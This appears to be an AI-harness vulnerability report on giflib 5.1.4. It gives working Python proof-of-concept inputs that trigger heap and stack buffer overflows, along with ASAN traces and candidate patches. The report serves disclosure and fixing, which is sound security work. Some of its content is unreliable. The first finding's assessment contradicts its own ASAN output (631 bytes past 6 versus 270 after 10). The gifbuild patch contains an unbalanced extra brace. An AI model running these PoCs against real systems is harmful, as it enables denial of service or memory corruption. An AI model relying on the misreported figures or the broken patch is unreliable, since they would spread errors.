# giflib 5.1.4 -- Validated Findings

**Target**: giflib 5.1.4
**Discovered by**: Mantis
**Original harness (historical baseline)**: Claude Code agent (sonnet-4-6), 2026-04-14
**Updated harness**: litellm-based ReAct agent loop, 2026-04-25
**Total validated findings**: 3 (Claude Sonnet), 6 (GPT-5.4), 0 (GPT-4o)

---

## Summary Table

| # | Type | Location | Severity | CVSS Est. | CVE | Reproduced Across Runs |
|---|------|----------|----------|-----------|-----|------------------------|
| 1 | heap-buffer-overflow (READ) | `util/gif2rgb.c:293` in `DumpScreen2RGB` | Tier 3 | 6.2 | CVE-2016-3977 | Yes (original + run 1 + run 2) |
| 2 | stack-buffer-overflow (WRITE) | `util/gifbuild.c:242` in `Icon2Gif` | Tier 4 | 8.2 | TBD | Yes (run 1 + run 2) |
| 3 | heap-buffer-overflow (READ) | `lib/gifalloc.c:148` in `GifUnionColorMap` | Tier 3 | 6.2 | TBD | Run 1 only |

## Run Details

### Cross-Backend Comparison

| Backend | Model | Run ID | Date | Files | Findings | Validated | Cost | Notes |
|---------|-------|--------|------|-------|----------|-----------|------|-------|
| Anthropic | claude-sonnet-4-6 | `3fb19f15` | 2026-04-25 | 10 | 3 | 3 | — | Discovered #1, #2, #3 |
| Anthropic | claude-sonnet-4-6 | `d49e47aa` | 2026-04-25 | 10 | 2 | 2 | — | Replicated #1, #2 |
| OpenAI | gpt-5.4 | `398e1c3e` | 2026-04-26 | 10 | 8 | 6 | $0.11 | Discovered #1, #2, #3 + 5 new findings |
| OpenAI | gpt-4o | `b751cac9` | 2026-04-26 | 10 | 0 | 0 | $0.00 | No crashes triggered |

**Key takeaway**: GPT-5.4 found the most vulnerabilities (8 findings, 6 validated) at the lowest cost ($0.11 for 10 files). GPT-4o found zero. Claude Sonnet found 3 validated findings across two runs. All backends used the same pipeline, same target, same static ranker, same ASAN instrumentation.

### Claude Sonnet Runs

The litellm-based harness was run twice with Claude Sonnet. Both runs independently discovered findings 1 and 2. Finding 3 was discovered only in run 1.

Finding #1 was originally discovered on 2026-04-14 using a Claude Code CLI-based baseline run (12 of 40 turns, cost $0.74) and has now been replicated by the updated litellm-based harness in both independent runs.

### GPT-5.4 Run (2026-04-26)

Run `398e1c3e-4348-4b07-afec-7a402a621461` discovered 8 findings (6 validated, 0 rejected, 2 needs-human-triage). GPT-5.4 independently rediscovered all 3 Claude Sonnet findings plus 5 additional vulnerabilities not found by Claude:

| # | File | Vuln Type | Tier | CVSS | New? |
|---|------|-----------|------|------|------|
| 1 | `dgif_lib.c:268` | heap-buffer-overflow | 3 | 6.2 | Variant of Finding #1 (decoder side) |
| 2 | `getarg.c:417` | stack-buffer-overflow | **4** | **8.2** | **New** — unbounded writes past MAX_PARAM |
| 3 | `gif2rgb.c:294` | heap-buffer-overflow | 3 | 6.2 | Same as Finding #1 |
| 4 | `gifbuild.c:287` | stack-buffer-overflow | **4** | **8.2** | Variant of Finding #2 (sscanf overflow) |
| 5 | `giftext.c:330` | null-pointer-deref | 2 | 4.2 | **New** — NULL deref with missing colormap |
| 6 | `gifalloc.c:55` | heap-buffer-overflow | 3 | 6.2 | Variant of Finding #3 (palette index) |
| 7 | `gif_font.c:169` | global-buffer-overflow | 3 | 6.2 | **New** — signed char negative index into font table |
| 8 | `egif_lib.c:583` | heap-buffer-overflow | 3 | 6.2 | **New** — untrusted ExtLen in encoder API |

Notable GPT-5.4-only findings:
- **getarg.c stack overflow** (Tier 4): `GAGetMultiParmeters` stores args in fixed `TmpArray[MAX_PARAM]` without bounds check. 100+ wildcard args overflow the stack.
- **gif_font.c global-buffer-overflow**: `GifDrawText8x8()` indexes 128-entry font table with `(short)(*cp)`. Signed char values >= 0x80 produce negative indices.
- **giftext.c null-pointer-deref**: Missing global + local colormap causes NULL deref in `PrintCodeBlock()`.
- **egif_lib.c heap-buffer-overflow**: Encoder trusts caller-supplied `ExtLen` without bounds check, causing OOB read.

### GPT-4o Run (2026-04-26)

Run `b751cac9-6123-4c4d-8d6f-628c14d3c6cc` completed all 10 containers with exit code 0 but found no vulnerabilities. All workers returned `verdict: not_found` with small stdout (639-1286 bytes), suggesting the model did not probe deeply enough to trigger ASAN crashes.

---

## Finding #1 -- heap-buffer-overflow in `DumpScreen2RGB` (CVE-2016-3977)

**Status**: Confirmed by ASAN -- matches CVE-2016-3977
**Severity Tier**: 3 (arbitrary read)
**CVSS Estimate**: 6.2 (High) -- unconfirmed, awaits human review
**File**: `util/gif2rgb.c:293` in `DumpScreen2RGB`
**Original discovery**: Mantis historical baseline run (Claude Code agent, sonnet-4-6), 2026-04-14 (12 of 40 turns, $0.74)
**Replicated**: 2026-04-25 by litellm-based harness in run `3fb19f15` (finding `a976bacd`) and run `d49e47aa` (finding `19e74e56`)

### Description

In `DumpScreen2RGB()`, pixel values from the GIF image (`GifRow[j]`, type `uint8_t`, range 0-255) are used directly as indices into `ColorMap->Colors[]` without any bounds check against `ColorMap->ColorCount`. A crafted GIF can declare a small colormap (e.g., 2 colors, `ColorCount=2`) while embedding pixel data with LZW-encoded values up to 255. When the decoder emits pixel index 255 and `DumpScreen2RGB` tries to look up `Colors[255]`, it reads 631+ bytes past the end of the 6-byte heap allocation, causing a heap-buffer-overflow. The same bug exists at line 316 in the non-`OneFileFlag` code path.

### Vulnerable Code

```c
// util/gif2rgb.c:293
ColorMapEntry = &ColorMap->Colors[GifRow[j]];   // OOB READ: no bounds check
```

### Trigger Conditions

| Field | Value |
|-------|-------|
| Global colormap size | 2 entries (6 bytes: black + white) |
| LZW minimum code size | 8 (so `ClearCode = 256`) |
| Pixel values emitted by decoder | up to 255 (valid per LZW spec) |
| `ColorMap->ColorCount` | 2 |
| `Colors[255]` access | 631 bytes past end of 6-byte allocation |

### ASAN Output

From the original discovery:
```
==2505==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000288
READ of size 1 at 0x502000000288 thread T0
    #0 in DumpScreen2RGB /tmp/src/util/gif2rgb.c:294:45
    #1 in GIF2RGB /tmp/src/util/gif2rgb.c:474:5
    #2 in main /tmp/src/util/gif2rgb.c:525:2

0x502000000288 is located 270 bytes after 10-byte region [0x502000000170,0x50200000017a)
allocated by thread T0 here:
    #0 in malloc
    #1 in GIF2RGB /tmp/src/util/gif2rgb.c:392:38

SUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/src/util/gif2rgb.c:294:45 in DumpScreen2RGB
```

From the litellm-based harness:
```
heap-buffer-overflow READ in DumpScreen2RGB /tmp/src/util/gif2rgb.c:293
```

### Reproduction

```bash
python3 -c "
import struct, sys
header = b'GIF89a'
lsd = struct.pack('<HHBBb', 2, 2, 0x80, 0, 0)
gct = bytes([255,0,0, 0,255,0])
img_desc = b',' + struct.pack('<HHHHB', 0, 0, 2, 2, 0)
bits = []
def add_code(code, size):
    for i in range(size): bits.append((code >> i) & 1)
add_code(256,9); add_code(255,9); add_code(255,9); add_code(255,9); add_code(255,9); add_code(257,9)
img_bytes = []
for i in range(0, len(bits), 8):
    byte = 0
    for j in range(8):
        if i+j < len(bits): byte |= bits[i+j] << j
    img_bytes.append(byte)
img_data = bytes([8]) + bytes([len(bytes(img_bytes))]) + bytes(img_bytes) + bytes([0])
gif = header + lsd + gct + img_desc + img_data + b';'
sys.stdout.buffer.write(gif)
" > /tmp/test_oob.gif && /tmp/bin/gif2rgb /tmp/test_oob.gif
```

### Candidate Patch

```diff
--- a/util/gif2rgb.c
+++ b/util/gif2rgb.c
@@ -290,7 +290,10 @@ static void DumpScreen2RGB(char *FileName, int OneFileFlag,
             GifQprintf("\b\b\b\b%-4d", ScreenHeight - i);
             for (j = 0, BufferP = Buffer; j < ScreenWidth; j++) {
-                ColorMapEntry = &ColorMap->Colors[GifRow[j]];
+                GifByteType colorIdx = GifRow[j];
+                if (colorIdx >= ColorMap->ColorCount)
+                    colorIdx = ColorMap->ColorCount - 1;
+                ColorMapEntry = &ColorMap->Colors[colorIdx];
                 *BufferP++ = ColorMapEntry->Red;
                 *BufferP++ = ColorMapEntry->Green;
                 *BufferP++ = ColorMapEntry->Blue;
@@ -313,7 +316,10 @@ static void DumpScreen2RGB(char *FileName, int OneFileFlag,
             GifQprintf("\b\b\b\b%-4d", ScreenHeight - i);
             for (j = 0; j < ScreenWidth; j++) {
-                ColorMapEntry = &ColorMap->Colors[GifRow[j]];
+                GifByteType colorIdx = GifRow[j];
+                if (colorIdx >= ColorMap->ColorCount)
+                    colorIdx = ColorMap->ColorCount - 1;
+                ColorMapEntry = &ColorMap->Colors[colorIdx];
                 Buffers[0][j] = ColorMapEntry->Red;
                 Buffers[1][j] = ColorMapEntry->Green;
                 Buffers[2][j] = ColorMapEntry->Blue;
```

### Validation Assessment

Both independent runs validated this finding. The ASAN output shows a READ of 1 byte at an address 631 bytes past a 6-byte allocation (2 colors x 3 bytes = 6 bytes), matching the described scenario of accessing `Colors[255]` with only 2 colors allocated. The reproduction is concrete, minimal, and technically sound. The vulnerability is in a file parsing utility processing untrusted GIF input, representing a genuine attack surface.

### CVE Reference

This matches the pattern of **CVE-2016-3977** -- a heap-based buffer overflow in giflib via malformed GIF images with mismatched colormap/LZW configurations. May also relate to CVE-2015-7555. Human researcher should confirm CVE attribution.

---

## Finding #2 -- stack-buffer-overflow in `Icon2Gif`

**Status**: Awaiting human review
**Severity Tier**: 4 (stack write -- potential code execution)
**CVSS Estimate**: 8.2 (High) -- unconfirmed, awaits human review
**File**: `util/gifbuild.c:242` in `Icon2Gif`
**Discovered**: 2026-04-25 by litellm-based harness
**Reproduced in**: run `3fb19f15` (finding `705e0524`) and run `d49e47aa` (finding `fe54ac4b`)

### Description

A stack buffer overflow exists in `Icon2Gif()` in `util/gifbuild.c`. The local arrays `GlobalColorKeys` and `LocalColorKeys` are declared as `char[PRINTABLES]` where `PRINTABLES=93`. The variable `ColorMapSize` is used as an unbounded index into `KeyTable` (which points to one of these arrays) when parsing `rgb X X X is Y` color map entries via `sscanf`. Since a GIF color map supports up to 256 entries, providing 94 or more color entries causes `ColorMapSize` to reach 93, and `sscanf` writes one byte past the end of the array. More entries continue to overflow into adjacent stack variables.

### Vulnerable Code

```c
// util/gifbuild.c:242
sscanf(buf, "\trgb %d %d %d is %c",
       &red, &green, &blue, &KeyTable[ColorMapSize])   // OOB WRITE: no bounds check
```

### Trigger Conditions

| Field | Value |
|-------|-------|
| `PRINTABLES` constant | 93 |
| `GlobalColorKeys` / `LocalColorKeys` size | `char[93]` (stack-allocated) |
| `ColorMapSize` at overflow | 93 (valid indices: 0-92) |
| Attack input | 94+ `rgb R G B is X` directives in a `screen map` block |

### ASAN Output

```
stack-buffer-overflow WRITE in Icon2Gif util/gifbuild.c:242
```

ASAN identifies the overflowed variable as `GlobalColorKeys` at offset 1917 (= 1824 + 93), confirming a 1-byte write past the end of the 93-element array.

### Reproduction

```bash
python3 -c "
lines = ['screen width 100\n','screen height 100\n','screen colors 256\n','screen background 0\n','pixel aspect byte 0\n','\n','screen map\n']
for i in range(94):
    lines.append('\trgb %d %d %d is A\n' % (i%256,i%256,i%256))
lines.extend(['end\n','\n','image\n','image top 0\n','image left 0\n','image bits 1 by 1\n','A\n'])
open('/tmp/poc_minimal.txt','w').writelines(lines)
" && /tmp/src/util/gifbuild < /tmp/poc_minimal.txt > /dev/null
```

### Candidate Patch

```diff
--- a/util/gifbuild.c
+++ b/util/gifbuild.c
@@ -239,6 +239,11 @@ static void Icon2Gif(char *FileName, FILE *txtin, int fdout)
 	// cppcheck-suppress invalidscanf
 	else if (sscanf(buf, "\trgb %d %d %d is %c",
 		   &red, &green, &blue, &KeyTable[ColorMapSize]) == 4)
+	{
+	    if (ColorMapSize >= PRINTABLES) {
+		PARSE_ERROR("Too many color map entries for symbol table (max PRINTABLES).");
+		exit(EXIT_FAILURE);
+	    }
 	{
 	    ColorMap[ColorMapSize].Red = red;
 	    ColorMap[ColorMapSize].Green = green;
```

### Validation Assessment

Both runs validated this finding. The ASAN output names the exact overflowed variable (`GlobalColorKeys` at line 124), the exact write location (offset 1917, which is exactly 93 bytes past the start of `GlobalColorKeys[93]`), and the call stack traces through `sscanf -> Icon2Gif:242`. The reproduction is deterministic -- generating 94 `rgb R G B is X` lines in a `screen map` block triggers the overflow. A one-byte stack write past a local array can potentially be leveraged for code execution depending on stack layout. While `gifbuild` is not typically network-facing, it could be invoked in build pipelines or image processing workflows where attacker-controlled input is processed.

---

## Finding #3 -- heap-buffer-overflow (underflow) in `GifUnionColorMap`

**Status**: Awaiting human review
**Severity Tier**: 3 (heap read underflow)
**CVSS Estimate**: 6.2 (High) -- unconfirmed, awaits human review
**File**: `lib/gifalloc.c:148` in `GifUnionColorMap`
**Discovered**: 2026-04-25 by litellm-based harness
**Found in**: run `3fb19f15` only (finding `d8e89d3f`)

### Description

In `GifUnionColorMap()`, the `while` loop at lines 148-151 decrements `CrntSlot` without checking if it reaches 0. This loop is intended to skip trailing all-black `(0,0,0)` colors at the end of `ColorIn1`'s color table. When ALL colors in `ColorIn1` are `{0,0,0}` (e.g., when a GIF has an all-black global color map), `CrntSlot` decrements to 0 and then the loop condition attempts to access `ColorIn1->Colors[CrntSlot - 1]` = `Colors[-1]`, which is a heap buffer underflow -- reading 3 bytes before the start of the `Colors[]` array allocated by `GifMakeMapObject`.

### Vulnerable Code

```c
// lib/gifalloc.c:148-151
while (ColorIn1->Colors[CrntSlot - 1].Red == 0    // OOB READ when CrntSlot == 0
       && ColorIn1->Colors[CrntSlot - 1].Green == 0
       && ColorIn1->Colors[CrntSlot - 1].Blue == 0)
    CrntSlot--;
```

### Trigger Conditions

| Field | Value |
|-------|-------|
| `ColorIn1` colormap | All entries are `{0, 0, 0}` (all-black) |
| `CrntSlot` initial value | `ColorCount` (e.g., 2) |
| Loop behavior | Decrements to 0, then accesses `Colors[-1]` |
| Underflow size | 3 bytes before the start of a 6-byte heap allocation |

### ASAN Output

```
heap-buffer-overflow READ in GifUnionColorMap /tmp/src/lib/gifalloc.c:148
```

ASAN reports a READ of size 1 at an address 3 bytes before a 6-byte region (2-entry color table: 2 x 3 = 6 bytes), allocated by `GifMakeMapObject` via `calloc`.

### Reproduction

```bash
python3 -c "
import struct
data = bytearray()
data += b'GIF89a'
data += struct.pack('<H', 1)
data += struct.pack('<H', 1)
data += bytes([0x80, 0, 0])
for i in range(2):
    data += bytes([0, 0, 0])
data += bytes([0x2C])
data += struct.pack('<H', 0)
data += struct.pack('<H', 0)
data += struct.pack('<H', 1)
data += struct.pack('<H', 1)
data += bytes([0x00, 0x02, 0x02, 0x54, 0x01, 0x00, 0x3B])
with open('/tmp/allblack.gif', 'wb') as f:
    f.write(data)
" && printf 'screen width 1\nscreen height 1\nscreen colors 2\nscreen background 0\npixel aspect byte 0\n\nscreen map\n\tsort flag off\n\trgb 000 000 000 is 0\n\trgb 000 000 000 is 1\nend\n\ninclude /tmp/allblack.gif\n\nimage # 1\nimage left 0\nimage top 0\nimage bits 1 by 1\n0\n' > /tmp/trigger.txt && /tmp/bin/gifbuild < /tmp/trigger.txt
```

### Candidate Patch

```diff
--- a/lib/gifalloc.c
+++ b/lib/gifalloc.c
@@ -145,9 +145,9 @@ GifUnionColorMap(const ColorMapObject *ColorIn1,
      * Back CrntSlot down past all contiguous {0, 0, 0} slots at the end
      * of table 1.  This is very useful if your display is limited to
      * 16 colors.
      */
-    while (ColorIn1->Colors[CrntSlot - 1].Red == 0
+    while (CrntSlot > 0
+           && ColorIn1->Colors[CrntSlot - 1].Red == 0
            && ColorIn1->Colors[CrntSlot - 1].Green == 0
            && ColorIn1->Colors[CrntSlot - 1].Blue == 0)
         CrntSlot--;
```

### Validation Assessment

The ASAN output is consistent with a real heap buffer underflow: it shows a READ of size 1 at an address 3 bytes before a 6-byte region, allocated by `GifMakeMapObject` via `calloc`. The root cause is clear -- the `while` loop at line 148 lacks a `CrntSlot > 0` guard. The reproduction uses a straightforward all-black colormap. While this is a read-only underflow of 3 bytes (limiting exploitability), it can cause crashes and potentially leak heap metadata. The patch is correct and minimal.

---

## Reviewer Sign-off Required

- [ ] Confirmed real vulnerabilities
- [ ] CVSS confirmed for each finding: ____
- [ ] CVE attribution confirmed: ____
- [ ] Disclosure approved
- [ ] Patches approved for submission
- [ ] Reviewer: __________________ Date: __________
